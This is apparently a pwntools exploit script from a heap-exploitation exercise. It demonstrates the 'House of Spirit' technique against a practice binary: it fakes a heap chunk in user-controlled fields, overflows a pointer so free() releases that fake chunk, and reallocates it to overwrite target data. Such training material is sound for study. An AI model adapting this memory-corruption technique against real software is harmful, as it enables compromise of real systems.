#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_spirit")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size, data & chunk name.
# Returns chunk index.
def malloc(size, data, name):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.sendafter("name: ", name)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send the index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.timeout = 0.1

# =============================================================================

# The "age" field will act as a fake chunk size field.
age = 0x81
io.sendafter("age: ", f"{age}")

# The 4th qword of the "username" field will act as the fake chunk's succeeding size field.
# Set it to any value between 2*SIZE_SZ and av->system_mem.
username = pack(0)*3 + pack(0x20fff)
io.sendafter("username: ", username)
io.recvuntil("> ")

# Request any sized chunk then use the stack overflow to overwrite the pointer that will be
# passed to free() with the address of the fake chunk's user data.
name = b"A"*8 + pack(elf.sym.user + 0x10)
chunk_A = malloc(0x18, "Y"*0x18, name)

# Free the fake chunk.
free(chunk_A)

# The next request for an 0x80-sized chunk is serviced by the fake chunk.
# Write into the fake chunk to overwrite the target data.
malloc(0x78, "Y"*0x40 + "Much win", "B")

# =============================================================================

io.interactive()
